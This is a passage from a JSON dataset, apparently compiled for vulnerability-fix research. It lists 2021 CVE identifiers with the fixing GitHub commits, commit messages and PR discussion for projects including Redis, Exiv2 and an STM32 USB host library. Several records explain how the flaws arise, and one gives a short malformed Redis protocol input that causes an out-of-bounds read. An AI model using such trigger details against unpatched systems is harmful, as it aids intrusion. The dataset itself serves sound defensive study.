            "commit_url": "https://github.com/STMicroelectronics/stm32_mw_usb_host/commit/15c4631397bb61bcbf0dae7f46ddcad1bd26c86f",
            "commit_msg": "Fix buffer overflow\n\nIn case the descriptor contains more endpoints than USBH_MAX_NUM_ENDPOINTS the Ep_Desc array and subsequent members of USBH_HandleTypeDef that contains function pointers are overwritten allowing arbitrary code execution.",
            "commit_msg_words": 30,
            "other_info": "Fix buffer overflow Hi @Defonceuse,\r\n\r\nThank you for this fix proposal. The point will be forwarded to our development teams. I will get back to you as soon as I have their feedback.\r\n\r\nMay I ask you whether you noticed the point just by reviewing the code or whether you actually experienced a failure due to this implementation? Thank you in advance for your reply.\r\n\r\nWith regards, Hi @ALABSTM ,\r\nAt the Swiss NCSC (National Cybersecurity Center), we have been contacted by the original reporter in January 2022 to assign a CVE number for this issue. \r\n\r\nWe were unable to get a security contact at your company via other channels, please contact us at vulnerability@ncsc.ch so we can discuss this case.  Hi @ncsc-ch-vuln-mgmt,\r\n\r\nYour request has been forwarded internally. I will get back to you as soon as I have an answer.\r\n\r\nWith regards, Hi @ALABSTM,\r\n\r\nSorry for\u00a0the\u00a0delay, I overlooked your question.\r\n\r\n> May I ask you whether you noticed the point just by reviewing the code or whether you actually experienced a failure due to this implementation? Thank you in advance for your reply.\r\n\r\nI became aware of the problem when I connected a USB Mass Storage device that has more than USBH_MAX_NUM_ENDPOINTS and an exception handler was immediately triggered.\r\n\r\nI did not review the code as it was treated\u00a0as\u00a0third\u00a0party code. Had it been reviewed the vulnerability would likely become obvious when checking for the\u00a0coding\u00a0rule that array indexes must be range-checked before use in case it is received\u00a0from an external/untrusted source.\r\n\r\nKind regards, It was missed to merge this important vulnerability fix into recent releases. Please confirm to merge into the upcoming release. Hi, \r\nAs this vulnerability has been open and publicly documented for a while,and since we did not get feedback from the vendor we have issued a CVE at the finders request CVE-2021-42553 https://www.cve.org/CVERecord?id=CVE-2021-42553 Release v3.5.1 addresses CVE-2021-42553 Hi @Defonceuse,\r\n\r\nReally sorry for this delay.  Your pull-request has just been merged. Thank you very much for your contribution. Looking forward to receiving other ones.\r\n\r\nWith regards, Hi @ncsc-ch-vuln-mgmt,\r\n\r\nReally sorry for this delay too. Thank you very much for the notification about the CVE identifier creation.\r\n\r\nA `SECURITY.md` file (like [this](https://github.com/STMicroelectronics/STM32CubeC0/blob/main/SECURITY.md) one) will be uploaded into this repository that will provide users with the contact info in case they have detected any vulnerability related to security aspects.\r\n\r\nWith regards,",
            "pr_title_words": 3,
            "comments_words": 397,
            "total_other_info_words": 400
        },
        {
            "cve-id": "CVE-2021-21369",
            "commit_url": "https://github.com/hyperledger/besu/commit/06e35a58c07a30c0fbdc0aae45a3e8b06b53c022",
            "commit_msg": "Improvements to authenticated JSON-RPC permissions checking (#1144)\n\n* exit early if matching permission found; add test for *:* permission\r\n\r\nSigned-off-by: Sally MacFarlane <sally.macfarlane@consensys.net>",
            "commit_msg_words": 23,
            "other_info": "Improvements to authenticated JSON-RPC permissions checking",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2021-21280",
            "commit_url": "https://github.com/contiki-ng/contiki-ng/commit/b88e5c303db21578799e5083bda9580922dc17b4",
            "commit_msg": "Check that there is enough room in the buffer to write an external header.",
            "commit_msg_words": 14,
            "other_info": "Prevent out-of-bounds write when processing external headers in sicslowpan",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2021-26199",
            "commit_url": "https://github.com/jerryscript-project/jerryscript/commit/bf2c9e1f06f00d32c945d8e96c8b7c3b67f63455",
            "commit_msg": "Fix a use-after-free in RegExp.prototype.compile\n\nFixes #4056.\n\nJerryScript-DCO-1.0-Signed-off-by: D\u00e1niel B\u00e1tyai daniel.batyai@h-lab.eu",
            "commit_msg_words": 11,
            "other_info": "Fix a use-after-free in RegExp.prototype.compile",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2021-41035",
            "commit_url": "https://github.com/eclipse-openj9/openj9/commit/c6e0d9296ff9a3084965d83e207403de373c0bad",
            "commit_msg": "Throw IAE when an InterfaceHandle thunk finds a non-public method\n\nThe interface dispatch implemented by InterfaceHandle is supposed to\nthrow IllegalAccessError (IAE) when the dispatched callee is not public,\njust like the dispatch performed by invokeinterface.",
            "commit_msg_words": 36,
            "other_info": "Throw IllegalAccessError (IAE): Lookup.findVirtual This has been tested internally.",
            "pr_title_words": 4,
            "comments_words": 5,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2021-45293",
            "commit_url": "https://github.com/WebAssembly/binaryen/commit/27135d613f929214dd2f74ca106f32310bc7e65b",
            "commit_msg": "Add requireFunctionContext in necessary places",
            "commit_msg_words": 5,
            "other_info": "Add requireFunctionContext in necessary places I think that might be a good idea. The overhead should not be too high.",
            "pr_title_words": 5,
            "comments_words": 15,
            "total_other_info_words": 20
        },
        {
            "cve-id": "CVE-2021-28168",
            "commit_url": "https://github.com/eclipse-ee4j/jersey/commit/5794b7a2da9bfc3404cc662b988fbee55f74059d",
            "commit_msg": "priviliged action for security exception\n\nSigned-off-by: Maxim Nesen <maxim.nesen@oracle.com>",
            "commit_msg_words": 9,
            "other_info": "switching to NIO tmp file creation approach @senivam Can this be back-ported to  2.29.1?",
            "pr_title_words": 7,
            "comments_words": 7,
            "total_other_info_words": 14
        },
        {
            "cve-id": "CVE-2021-31572",
            "commit_url": "https://github.com/FreeRTOS/FreeRTOS-Kernel/commit/d05b9c123f2bf9090bce386a244fc934ae44db5b",
            "commit_msg": "Add addition overflow check for stream buffer (#226)",
            "commit_msg_words": 8,
            "other_info": "Add addition overflow check for stream buffer",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2021-3521",
            "commit_url": "https://github.com/rpm-software-management/rpm/commit/bd36c5dc9fb6d90c46fbfed8c2d67516fc571ec8",
            "commit_msg": "Validate and require subkey binding signatures on PGP public keys\n\nAll subkeys must be followed by a binding signature by the primary key\nas per the OpenPGP RFC, enforce the presence and validity in the parser.\n\nThe implementation is as kludgey as they come to work around our\nsimple-minded parser structure without touching API, to maximise\nbackportability. Store all the raw packets internally as we decode them\nto be able to access previous elements at will, needed to validate ordering\nand access the actual data. Add testcases for manipulated keys whose\nimport previously would succeed.\n\nDepends on the two previous commits:\n7b399fcb8f52566e6f3b4327197a85facd08db91 and\n236b802a4aa48711823a191d1b7f753c82a89ec5\n\nFixes CVE-2021-3521.",
            "commit_msg_words": 106,
            "other_info": "Validate and require subkey binding signatures on PGP public keys Hi @DemiMarie,\r\n\r\nI followed  `https://access.redhat.com/articles/3359321` to generate keys. But after this fix, I'm unable to import the keys.\r\n\r\n```\r\nroot [ ~ ]# rpm --import foo.key \r\nerror: foo.key: key 1 import failed.\r\n\r\nroot [ ~ ]# rpm -qi rpm\r\nName        : rpm\r\nVersion     : 4.16.1.3\r\nRelease     : 12.ph4\r\nArchitecture: x86_64\r\nInstall Date: Tue Sep 13 16:57:51 2022\r\n```\r\n\r\nCan you please assist me on generating the keys properly?\r\n\r\nHere are my patches where I back ported this CVE fix to 4.16.x\r\n\r\nhttps://github.com/vmware/photon/blob/4.0/SPECS/rpm/CVE-2021-3521-1.patch\r\nhttps://github.com/vmware/photon/blob/4.0/SPECS/rpm/CVE-2021-3521-2.patch\r\nhttps://github.com/vmware/photon/blob/4.0/SPECS/rpm/CVE-2021-3521-3.patch @sshedi GnuPG always generates subkey binding signatures by default. @sshedi you will also need to backport daeddb01de50c53b98eae75e11234132ae63538a But why the import failure? I saw some other discussions https://github.com/rpm-software-management/rpm/issues/1977\r\n\r\nHow can I generate gpg keys with sha512 algo?\r\n\r\nI tried this:\r\n```\r\n$ cat .gnupg/gpg.conf \r\npersonal-digest-preferences SHA512\r\ncert-digest-algo SHA512\r\ndefault-preference-list SHA512 SHA384 SHA256 SHA224 AES256 AES192 AES CAST5 ZLIB BZIP2 ZIP Uncompressed\r\n```\r\nbut still I'm getting import failure.  A closed PR is hardly a place for assistance requests of any kind. Please open a [discussion](https://github.com/rpm-software-management/rpm/discussions) on the subject. Sorry about that @pmatilai.\r\nWe can continue here https://github.com/rpm-software-management/rpm/discussions/2186",
            "pr_title_words": 10,
            "comments_words": 181,
            "total_other_info_words": 191
        },
        {
            "cve-id": "CVE-2021-35041",
            "commit_url": "https://github.com/FISCO-BCOS/FISCO-BCOS/commit/d9c2dc1c26afb7a10a0834bd89683bfcbbeae408",
            "commit_msg": "Fix the problem of memory growth caused by forged P2P message packets",
            "commit_msg_words": 12,
            "other_info": "Fix the problem of memory growth caused by forged P2P message packets # [Codecov](https://codecov.io/gh/FISCO-BCOS/FISCO-BCOS/pull/1958?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=FISCO-BCOS) Report\n> :exclamation: No coverage uploaded for pull request base (`release-2.8.0@8c1f492`). [Click here to learn what that means](https://docs.codecov.io/docs/error-reference?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=FISCO-BCOS#section-missing-base-commit).\n> The diff coverage is `n/a`.\n\n[![Impacted file tree graph](https://codecov.io/gh/FISCO-BCOS/FISCO-BCOS/pull/1958/graphs/tree.svg?width=650&height=150&src=pr&token=knbQDpeNyQ&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=FISCO-BCOS)](https://codecov.io/gh/FISCO-BCOS/FISCO-BCOS/pull/1958?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=FISCO-BCOS)\n\n```diff\n@@               Coverage Diff                @@\n##             release-2.8.0    #1958   +/-   ##\n================================================\n  Coverage                 ?   75.33%           \n================================================\n  Files                    ?      540           \n  Lines                    ?    45943           \n  Branches                 ?        0           \n================================================\n  Hits                     ?    34611           \n  Misses                   ?    11332           \n  Partials                 ?        0           \n```",
            "pr_title_words": 12,
            "comments_words": 65,
            "total_other_info_words": 77
        },
        {
            "cve-id": "CVE-2021-41099",
            "commit_url": "https://github.com/redis/redis/commit/c6ad876774f3cc11e32681ea02a2eead00f2c521",
            "commit_msg": "Fix integer overflow in _sdsMakeRoomFor (CVE-2021-41099)",
            "commit_msg_words": 6,
            "other_info": "Release 6.0.16 CI failures on MacOS (due to tests being timing sensitive): \r\n```\r\n*** [err]: No write if min-slaves-max-lag is > of the slave lag in tests/integration/replication-2.tcl\r\nExpected 'NOREPLICAS*' to equal or match 'OK'\r\n*** [err]: With min-slaves-to-write: master not writable with lagged slave in tests/integration/replication-4.tcl\r\nExpected 'NOREPLICAS*' to equal or match 'OK'\r\nCleanup: may take some time... OK\r\n```\r\nsolved by #8461 and #8583\r\n\r\nalso, the `build-ubuntu-old` CI got hung (probably no longer supported) Hi,\r\n [hi_sdsMakeRoomFor](https://github.com/redis/redis/blob/4930d19e70c391750479951022e207e19111eb55/deps/hiredis/sds.c#L196)  in deps/hiredis/sds.c wouldn't c487a9c03f89498976b3b6574df2cac763af16cc commit be applicable for hiredis code as well?\r\n Pinging @michael-grunder, do you think this fix is relevant for hiredis?",
            "pr_title_words": 2,
            "comments_words": 98,
            "total_other_info_words": 100
        },
        {
            "cve-id": "CVE-2021-26825",
            "commit_url": "https://github.com/godotengine/godot/commit/113b5ab1c45c01b8e6d54d13ac8876d091f883a8",
            "commit_msg": "Fix a crash in the TGA loader with malformed input",
            "commit_msg_words": 10,
            "other_info": "[3.2] Fix a crash in the TGA loader with malformed input Thanks a lot to Carlos Ramirez Catano for reporting this bug. Attached are the files that show the issue.\r\n[poc-input.zip](https://github.com/godotengine/godot/files/5925643/poc-input.zip)\r\n Thanks!",
            "pr_title_words": 11,
            "comments_words": 21,
            "total_other_info_words": 32
        },
        {
            "cve-id": "CVE-2021-44994",
            "commit_url": "https://github.com/jerryscript-project/jerryscript/commit/9adbfb7f515ccd6aee82e66e068dccf8a0f39c4b",
            "commit_msg": "Fix memory leak in AtomicModifyWrite\n\nThis patch fixes #4894.\n\nJerryScript-DCO-1.0-Signed-off-by: Robert Fancsik robert.fancsik@h-lab.eu",
            "commit_msg_words": 13,
            "other_info": "Fix memory leak in AtomicModifyWrite",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2021-32762",
            "commit_url": "https://github.com/redis/redis/commit/0215324a66af949be39b34be2d55143232c1cb71",
            "commit_msg": "Fix redis-cli / redis-sential overflow on some platforms (CVE-2021-32762) (#9587)\n\nThe redis-cli command line tool and redis-sentinel service may be vulnerable\r\nto integer overflow when parsing specially crafted large multi-bulk network\r\nreplies. This is a result of a vulnerability in the underlying hiredis\r\nlibrary which does not perform an overflow check before calling the calloc()\r\nheap allocation function.\r\n\r\nThis issue only impacts systems with heap allocators that do not perform their\r\nown overflow checks. Most modern systems do and are therefore not likely to\r\nbe affected. Furthermore, by default redis-sentinel uses the jemalloc allocator\r\nwhich is also not vulnerable.\r\n\r\nCo-authored-by: Yossi Gottlieb <yossigo@gmail.com>",
            "commit_msg_words": 103,
            "other_info": "Fix redis-cli / redis-sential overflow on some platforms (CVE-2021-32762) @yossigo there's a memory leak here now - we need to call freeReplyObject(r) before returning NULL . Right, I see it's properly fixed in hiredis and we have diverged in other ways as well, so it's time to resync. Thanks!",
            "pr_title_words": 9,
            "comments_words": 40,
            "total_other_info_words": 49
        },
        {
            "cve-id": "CVE-2021-20300",
            "commit_url": "https://github.com/AcademySoftwareFoundation/openexr/commit/653176c8d147a34395cb24fb9cfadde83219b643",
            "commit_msg": "prevent overflow in hufUncompress if nBits is large\n\nSigned-off-by: Peter Hillman <peterh@wetafx.co.nz>",
            "commit_msg_words": 12,
            "other_info": "prevent overflow in hufUncompress if nBits is large",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2021-42715",
            "commit_url": "https://github.com/nothings/stb/commit/2a02ff76b5f4d2a0b01f0eee289c47e0901c49b6",
            "commit_msg": "Fixes two stb_image issues that could occur with specially constructed HDR and PGM files.\n\nSigned-off-by: Neil Bickford <nbickford@nvidia.com>",
            "commit_msg_words": 18,
            "other_info": "Fixes a crash and an infinite loop in stb_image that could occur with specially constructed PGM and HDR files Following up on this - is there anything I can change to help merge this in? Thanks! stb repository is just slow for me to update Quick note from the survey of the first 10 ossfuzz issues I did: I think this pull request might resolve ossfuzz issues https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=37628&q=proj%3Dstb&can=2 (this seems to be the infinite HDR reader error) and https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=38394&q=proj%3Dstb&can=2 (I think this is due to the PGM issue). I'm unable to reproduce ossfuzz's crashes with these fixes on Windows with Address Sanitizer enabled. Merged into dev branch, will be in the next release. Thanks so much ryg!",
            "pr_title_words": 19,
            "comments_words": 98,
            "total_other_info_words": 117
        },
        {
            "cve-id": "CVE-2021-33304",
            "commit_url": "https://github.com/virtualsquare/picotcp/commit/7c195747d88a37b4059f5ad9df4bfbb6f1179e08",
            "commit_msg": "Fix double free in pico_fragments_reassemble()",
            "commit_msg_words": 5,
            "other_info": "Fix double free in pico_fragments_reassemble()",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2021-32846",
            "commit_url": "https://github.com/moby/hyperkit/commit/af5eba2360a7351c08dfd9767d9be863a50ebaba",
            "commit_msg": "Fix virtio-sock pci_vtsock_proc_tx uninitialized memory use (GHSL-2021-057)\n\nSigned-off-by: Frederic Dalleau <frederic.dalleau@docker.com>",
            "commit_msg_words": 11,
            "other_info": "Various fixes",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2021-34335",
            "commit_url": "https://github.com/Exiv2/exiv2/commit/2d8d44e47b1500030e5b249bffbaf1e80aa74815",
            "commit_msg": "Defensive coding to avoid 0x80000000/0xFFFFFFFF FPE.",
            "commit_msg_words": 6,
            "other_info": "Avoid integer divide by zero This is the CodeQL query that I used to search for integer divide operations:\r\n\r\n```\r\nimport cpp\r\nimport semmle.code.cpp.rangeanalysis.SimpleRangeAnalysis\r\n\r\nfrom DivExpr div, Expr rhs\r\nwhere\r\n  rhs = div.getRightOperand() and\r\n  div.getType() instanceof IntegralType and\r\n  not (lowerBound(rhs) > 0 or upperBound(rhs) < 0) and\r\n  not rhs instanceof SizeofOperator and\r\n  exists(rhs.getLocation().getFile().getRelativePath())\r\nselect rhs, rhs.getType()\r\n```",
            "pr_title_words": 5,
            "comments_words": 52,
            "total_other_info_words": 57
        },
        {
            "cve-id": "CVE-2021-3674",
            "commit_url": "https://github.com/rizinorg/rizin/commit/16826ed91f10b353f9732f70b743d0afdaa07010",
            "commit_msg": "Fix warning when searching a section in a binary without any",
            "commit_msg_words": 11,
            "other_info": "Fix memory corruption in create_section_from_phdr +1 test waiting https://github.com/rizinorg/rizin-testbins/pull/40",
            "pr_title_words": 5,
            "comments_words": 4,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2021-3690",
            "commit_url": "https://github.com/undertow-io/undertow/commit/c7e84a0b7efced38506d7d1dfea5902366973877",
            "commit_msg": "[UNDERTOW-1935] - buffer leak on incoming websocket PONG message",
            "commit_msg_words": 9,
            "other_info": "[UNDERTOW-1935] - buffer leak on incoming websocket PONG message Hello, @radist-nt ! Thanks for your PR! Because it does not have a test case, I marked it as Under verification, after the CI runs I'll run your reproducer and check if it is possible to write a test case for this one. If it is not, it will be merged right away and ported to maintenance branches.",
            "pr_title_words": 9,
            "comments_words": 58,
            "total_other_info_words": 67
        },
        {
            "cve-id": "CVE-2021-32771",
            "commit_url": "https://github.com/contiki-ng/contiki-ng/commit/587ae59956e00316fd44fd7072ac3a6a07b4b20f",
            "commit_msg": "Check RPL Target prefix length and buffer boundary.",
            "commit_msg_words": 8,
            "other_info": "Check RPL Target prefix length and buffer boundary.",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2021-30045",
            "commit_url": "https://github.com/SerenityOS/serenity/commit/4317db7498eaa5a37068052bb0310fbc6a5f78e4",
            "commit_msg": "LibArchive: Make bounds checks stricter in the Zip parser\n\nWe now also check we have enough space in the incoming buffer for the\nvarious signatures and optional (length specified) fields. This helps\nprevents a possible heap overflow read.",
            "commit_msg_words": 38,
            "other_info": "LibArchive: Make bounds checks stricter in the Zip parser",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2021-32672",
            "commit_url": "https://github.com/redis/redis/commit/6ac3c0b7abd35f37201ed2d6298ecef4ea1ae1dd",
            "commit_msg": "Fix protocol parsing on 'ldbReplParseCommand' (CVE-2021-32672)\n\nThe protocol parsing on 'ldbReplParseCommand' (LUA debugging)\nAssumed protocol correctness. This means that if the following\nis given:\n*1\n$100\ntest\nThe parser will try to read additional 94 unallocated bytes after\nthe client buffer.\nThis commit fixes this issue by validating that there are actually enough\nbytes to read. It also limits the amount of data that can be sent by\nthe debugger client to 1M so the client will not be able to explode\nthe memory.",
            "commit_msg_words": 84,
            "other_info": "Release 6.0.16 CI failures on MacOS (due to tests being timing sensitive): \r\n```\r\n*** [err]: No write if min-slaves-max-lag is > of the slave lag in tests/integration/replication-2.tcl\r\nExpected 'NOREPLICAS*' to equal or match 'OK'\r\n*** [err]: With min-slaves-to-write: master not writable with lagged slave in tests/integration/replication-4.tcl\r\nExpected 'NOREPLICAS*' to equal or match 'OK'\r\nCleanup: may take some time... OK\r\n```\r\nsolved by #8461 and #8583\r\n\r\nalso, the `build-ubuntu-old` CI got hung (probably no longer supported) Hi,\r\n [hi_sdsMakeRoomFor](https://github.com/redis/redis/blob/4930d19e70c391750479951022e207e19111eb55/deps/hiredis/sds.c#L196)  in deps/hiredis/sds.c wouldn't c487a9c03f89498976b3b6574df2cac763af16cc commit be applicable for hiredis code as well?\r\n Pinging @michael-grunder, do you think this fix is relevant for hiredis?",
            "pr_title_words": 2,
            "comments_words": 98,
            "total_other_info_words": 100
        },
        {
            "cve-id": "CVE-2021-37618",
            "commit_url": "https://github.com/Exiv2/exiv2/commit/dbf472751fc8b87ea7d1de02f54eaf64233a2fb6",
            "commit_msg": "Better bounds checking in Jp2Image::printStructure",
            "commit_msg_words": 5,
            "other_info": "Better bounds checking in Jp2Image::printStructure",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2021-41110",
            "commit_url": "https://github.com/common-workflow-language/cwlviewer/commit/f6066f09edb70033a2ce80200e9fa9e70a5c29de",
            "commit_msg": "Use Yaml SafeConstructor (#355)",
            "commit_msg_words": 4,
            "other_info": "Use Yaml SafeConstructor to prevent serialization issues This pull request **fixes 1 alert** when merging 71aeadefe702d178442e0e284b04aeb500bd837d into 7b8eb67642222b84da6425b1c6ebdf864aa779df - [view on LGTM.com](https://lgtm.com/projects/g/common-workflow-language/cwlviewer/rev/pr-427c8c611816dff19e8d2a66863eebae6ffad683)\n\n**fixed alerts:**\n\n* 1 for Deserialization of user\\-controlled data This pull request **fixes 1 alert** when merging 3e7b69f2dece7b3edcaf3a06714f3483fa53b079 into 7b8eb67642222b84da6425b1c6ebdf864aa779df - [view on LGTM.com](https://lgtm.com/projects/g/common-workflow-language/cwlviewer/rev/pr-d1fb4513d2df84ca149eea248b9f16760509db37)\n\n**fixed alerts:**\n\n* 1 for Deserialization of user\\-controlled data",
            "pr_title_words": 7,
            "comments_words": 48,
            "total_other_info_words": 55
        },
        {
            "cve-id": "CVE-2021-22879",
            "commit_url": "https://github.com/nextcloud/desktop/commit/013f3cea70acfe7b701cb73c93744d5ff5c0c213",
            "commit_msg": "Validate sensitive URLs to onle allow http(s) schemes.\n\nSigned-off-by: allexzander <blackslayer4@gmail.com>",
            "commit_msg_words": 11,
            "other_info": "Validate sensitive URLs to onle allow http(s) schemes. I only validate those URLs coming from the server or user input. Please go through the rest of **QDesktopServices::openUrl** calls to see why I am not validating those. Non-validate URLs are either hard-coded or point to local files/folders. As @er-vin suggested, I did the revision of all the **QDesktopServices::openUrl** cases and only validated those risky-ones. /rebase > /rebase\r\n@camilasan \r\nI guess we need to discuss the necessity of this command, and I'd vote for not doing it in the GitHub PR unless absolutely sure we are merging it immediately :) > > /rebase\r\n> > @camilasan\r\n> > I guess we need to discuss the necessity of this command, and I'd vote for not doing it in the GitHub PR unless absolutely sure we are merging it immediately :)\r\n\r\nI did think I was going to merge it right away until Lukas commented on it... AppImage file: [Nextcloud-PR-2906-013f3cea70acfe7b701cb73c93744d5ff5c0c213-x86_64.AppImage](https://github.com/nextcloud-desktop-bot/ci-builds/releases/download/PR-2906/Nextcloud-PR-2906-013f3cea70acfe7b701cb73c93744d5ff5c0c213-x86_64.AppImage) <br/><br/>To test this change/fix you can simply download above AppImage file and test it. <br/><br/>Please make sure to quit your existing Nextcloud app and backup your data.  > > > /rebase\r\n> > > @camilasan\r\n> > > I guess we need to discuss the necessity of this command, and I'd vote for not doing it in the GitHub PR unless absolutely sure we are merging it immediately :)\r\n> \r\n> I did think I was going to merge it right away until Lukas commented on it...\r\n\r\n@camilasan I see. Sorry. /backport to stable-3.1",
            "pr_title_words": 8,
            "comments_words": 242,
            "total_other_info_words": 250
        },
        {
            "cve-id": "CVE-2021-3859",
            "commit_url": "https://github.com/undertow-io/undertow/commit/e43f0ada3f4da6e8579e0020cec3cb1a81e487c2",
            "commit_msg": "[UNDERTOW-1979] CVE-2021-3859 continuation frames are not read correctly",
            "commit_msg_words": 8,
            "other_info": "[UNDERTOW-1979] CVE-2021-3859 continuation frames are not read correctly",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2021-37620",
            "commit_url": "https://github.com/Exiv2/exiv2/commit/76e313745e813f80e8910aceb2210af3ad8cf897",
            "commit_msg": "Safer std::vector indexing.",
            "commit_msg_words": 3,
            "other_info": "0.27 maintenance Thank you for reporting this.  And even more thanks for providing a patch.  I'm very pleased to accept your pull request.  The Exiv2 project moved to Git with the release of v0.26 on 2017-04-28.  You have the honour of the first \"pull request\".  Congratulations and Thank You.\r\n\r\nAnd thanks for your observation that CMAKE_INSTALL_MANDIR is already in use.  The CMake files have been an accumulation of contributions by about 10 engineers over about 10 years.  Our nightly build uses CMake, so I have lots of confidence that it works.  However, if you are a CMake fan, I would highly value any observations or contribution you'd care to make concerning our CMakeList.txt files.",
            "pr_title_words": 2,
            "comments_words": 112,
            "total_other_info_words": 114
        },
        {
            "cve-id": "CVE-2021-29463",
            "commit_url": "https://github.com/Exiv2/exiv2/commit/783b3a6ff15ed6f82a8f8e6c8a6f3b84a9b04d4b",
            "commit_msg": "Improve bound checking in WebPImage::doWriteMetadata()",
            "commit_msg_words": 5,
            "other_info": "Main WebPImage bounds Thanks @piponazo! I was under the mistaken impression that these kinds of fixes were promoted automatically. > Thanks @piponazo! I was under the mistaken impression that these kinds of fixes were promoted automatically.\r\n\r\nActually in the past we were using a service that was making that kind of promotion very easy (just by adding a tag `to-main` to your PR pointing to `0.27-maintenance` that was done semi-automatically). But it looks like this is not available anymore ... I do not know what happend with that \ud83d\ude05",
            "pr_title_words": 3,
            "comments_words": 86,
            "total_other_info_words": 89
        },
        {
            "cve-id": "CVE-2021-34825",
            "commit_url": "https://github.com/quassel/quassel/commit/104d01d2c619f6926bcaccea860da90b19449ad5",
            "commit_msg": "core: Require TLS cert to be loaded if --require-ssl is used\nIf the user specifies --require-ssl, but the core cannot load a\nSSL/TLS certificate for any reason, the core will throw an\nexception and quit. This fixes a minor security vulnerability\nwhere previously, the core would simply fall back to plaintext\nmode and not offer encrypted connections at all.",
            "commit_msg_words": 59,
            "other_info": "core: Error out when --require-ssl is specified, but no cert can be loaded This security issue has been assigned `CVE-2021-34825` by MITRE. @phuzion has verified that, when reloading certs, the old cert continues being used if the new certs can not be found :) As @justjanne mentioned, I did some verification that reloading certs can't put a core into the plaintext-only mode.\r\n\r\nTo test this, I did the following:\r\n\r\n* Set up and launched a core, with a properly configured `quasselCert.pem` file in the configdir.\r\n* Connected to the core to ensure that it works properly\r\n* Disconnected from the core\r\n* Removed the `quasselCert.pem` file from the configdir\r\n* Sent `SIGHUP` (with `pkill -1 quasselcore`) to the core to trigger a configuration reload\r\n* Reconnected to the core\r\n\r\nAfter reconnecting, I was still presented with the previously configured SSL certificate.",
            "pr_title_words": 13,
            "comments_words": 128,
            "total_other_info_words": 141
        },
        {
            "cve-id": "CVE-2021-39176",
            "commit_url": "https://github.com/sonicdoe/detect-character-encoding/commit/d44356927b92e3b13e178071bf6d7c671766f588",
            "commit_msg": "Fix memory leak by properly closing `charsetDetector`",
            "commit_msg_words": 7,
            "other_info": "Fix memory leak by properly closing charsetDetector > Because Nan:ThrowError does not seem to break the execution order of the code in this file\r\n\r\nThank you for mentioning this. This is a bug on its own, I have fixed it in https://github.com/sonicdoe/detect-character-encoding/commit/2e3aa333a573960edf2d782bca3b25a01e49678b.\r\n\r\nBy the way, because the base branch of this repository is `develop` (instead of `master`), I have rebased your branch onto `develop`. Consequently, your fork\u2019s `master` branch may look a bit messy now.\r\n\r\nYou can take a look at the changes in https://github.com/sonicdoe/detect-character-encoding/commit/d44356927b92e3b13e178071bf6d7c671766f588. If it looks good to you, I\u2019ll release it as v0.3.1. Yes, looks good to me :+1: \r\n Released as [v0.3.1](https://github.com/sonicdoe/detect-character-encoding/releases/tag/v0.3.1). Thanks for the package update.",
            "pr_title_words": 7,
            "comments_words": 103,
            "total_other_info_words": 110
        },
        {
            "cve-id": "CVE-2021-45423",
            "commit_url": "https://github.com/merces/libpe/commit/9b5fedc37ccbcd23695a0e97c0fe46c999e26100",
            "commit_msg": "Checks if ordinal < exp->NumberOfFuntions before assigning value to an element in an array",
            "commit_msg_words": 14,
            "other_info": "Checks if ordinal < exp->NumberOfFuntions before assigning value to a\u2026 Thanks a lot!",
            "pr_title_words": 10,
            "comments_words": 3,
            "total_other_info_words": 13
        },
        {
            "cve-id": "CVE-2021-3878",
            "commit_url": "https://github.com/stanfordnlp/CoreNLP/commit/e5bbe135a02a74b952396751ed3015e8b8252e99",
            "commit_msg": "Missed a couple possibly unsafe XMLUtils",
            "commit_msg_words": 6,
            "other_info": "Missed a couple possibly unsafe XMLUtils Thanks for clarifying.  Any idea when the NVD website will be updated to show the true score and version fixed? Nope!\n\nI also have nothing to do with what they consider the true score... perhaps\nall XML vulnerabilities get flagged as severe?\n Is this fix included in version 4.3.1? Yes, but this is a very low risk situation anyway\n\nOn Wed, Oct 20, 2021, 12:09 PM wesley-philip ***@***.***>\nwrote:\n\n> Is this fix included in version 4.3.1?\n>\n> \u2014\n> You are receiving this because you authored the thread.\n> Reply to this email directly, view it on GitHub\n> <https://github.com/stanfordnlp/CoreNLP/commit/e5bbe135a02a74b952396751ed3015e8b8252e99#commitcomment-58395314>,\n> or unsubscribe\n> <https://github.com/notifications/unsubscribe-auth/AA2AYWMMTKWHK3RNMZZXNH3UH4HXTANCNFSM5GML3DKQ>\n> .\n> Triage notifications on the go with GitHub Mobile for iOS\n> <https://apps.apple.com/app/apple-store/id1477376905?ct=notification-email&mt=8&pt=524675>\n> or Android\n> <https://play.google.com/store/apps/details?id=com.github.android&referrer=utm_campaign%3Dnotification-email%26utm_medium%3Demail%26utm_source%3Dgithub>.\n>\n>\n I'm guessing the severity is still under review, because WhiteSource has flagged it as a 9.8 (critical) vulnerability: \r\n\r\nhttps://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-3878\r\n\r\nHowever, on the NVD site, there is no score: 